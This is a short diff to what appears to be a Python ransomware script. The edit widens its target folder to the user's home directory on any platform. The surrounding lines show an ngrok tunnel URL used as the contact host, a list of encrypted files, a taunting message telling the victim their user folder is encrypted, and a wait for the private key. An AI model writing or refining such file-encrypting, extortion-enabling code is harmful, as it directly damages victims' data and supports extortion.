@@ -26,7 +26,7 @@ import secrets
 
 # ngrok HTTP URL
 NGROK_URL = "https://placeholder.ngrok-free.app"
-TARGET_FOLDER = os.environ['USERPROFILE']
+TARGET_FOLDER = os.path.expanduser("~")
 encrypted_files = []
 
 
@@ -165,4 +165,5 @@ if __name__ == "__main__":
     os.system("cls")
     print("Whoops! Looks like I've encrypted your user folder :p")
     await_private_key()
+
     input("Ok you can close me now.")
